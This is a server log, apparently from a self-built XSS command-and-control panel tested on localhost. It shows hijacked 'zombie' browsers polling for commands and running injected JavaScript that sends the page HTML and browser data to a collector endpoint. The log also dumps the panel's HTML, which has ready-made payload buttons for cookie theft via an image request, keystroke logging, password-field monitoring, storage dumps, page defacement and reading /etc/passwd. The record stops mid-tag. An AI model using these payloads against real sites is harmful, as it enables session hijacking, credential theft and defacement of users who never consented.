            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:36.145687
2025-06-26 22:42:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0126s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:36] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:41 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:41 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:41.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0049s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:41] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:41 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:41 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:41.141815
2025-06-26 22:42:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0082s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:41] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:46 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:46 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:46 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:46.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0041s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:46] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:46 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:46 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:46.140857
2025-06-26 22:42:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0059s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:46] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:51 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:51 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:51 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:51.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0036s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:51] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:51 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:51 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:51.141100
2025-06-26 22:42:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0062s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:51] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:42:56 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:42:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:42:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:42:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:42:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:42:56 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:42:56 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:42:56.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:42:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0050s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:42:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:56] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:42:56 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:42:56 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:42:56.143224
2025-06-26 22:42:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0071s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:42:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:42:56] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:43:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:43:00 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:43:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:43:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:43:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:43:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:43:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:43:00 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:43:00 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:43:00.469Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:43:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0071s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:43:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:43:00] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:43:00 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:43:00 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:43:00.483061
2025-06-26 22:43:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0086s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:43:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:43:00] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:46:00 | INFO     | control_route.py:138 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:46:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:46:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:00] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:46:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:00 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:46:00 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:00 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:46:00.137Z"},時間: 2025-06-26 22:46:00.146182
2025-06-26 22:46:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0061s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:46:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:00] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:46:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:46:00 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:46:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0057s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" 